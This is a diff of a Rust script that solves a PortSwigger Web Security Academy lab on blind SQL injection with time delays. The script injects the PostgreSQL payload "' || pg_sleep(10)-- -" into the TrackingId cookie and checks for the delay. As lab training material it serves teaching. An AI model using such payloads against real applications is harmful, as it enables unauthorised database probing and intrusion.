@@ -1,86 +1,50 @@
-/***************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 23/9/2023
+/******************************************************************************
 *
 * Lab: Blind SQL injection with time delays
 *
-* Steps: 1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
-*        2. Wait for the response
+* Hack Steps: 
+*      1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
+*      2. Wait for the response
 *
-****************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*******************************************************************************/
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
-    collections::HashMap,
     io::{self, Write},
     time::Duration,
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0ab2009f04f00d1d824e6a2d00b000fc.web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0ac400ff046ccd62821c426700b700aa.web-security-academy.net";
+    println!("⦗#⦘ Injection point: {}", "TrackingId".yellow());
+    print!("❯❯ Injecting payload to cause a 10 seconds delay.. ");
+    io::stdout().flush().unwrap();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    println!(
-        "{} {}",
-        "[#] Injection point:".blue(),
-        "TrackingId".yellow(),
-    );
-
-    // payload to make a 10 seconds delay
     let payload = "' || pg_sleep(10)-- -";
-
-    println!(
-        "{}{}",
-        "1. Injecting payload to cause a 10 seconds delay.. ".white(),
-        "OK".green()
-    );
-    print!("{}", "2. Waiting for the response.. ".white());
-    io::stdout().flush();
-
-    // fetch the page with the injected payload
-    let make_delay = client
-        .get(format!("{url}/filter?category=Pets"))
-        .header("Cookie", format!("TrackingId={payload}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to make a delay with the injected payload".red()
-        ));
+    fetch_with_cookie("/filter?category=Pets", &payload);
 
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solvd".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
-        .connect_timeout(Duration::from_secs(20))
+        .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
+}
+
+fn fetch_with_cookie(path: &str, cookie: &str) -> Response {
+    let client = build_web_client();
+    client
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("TrackingId={cookie}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
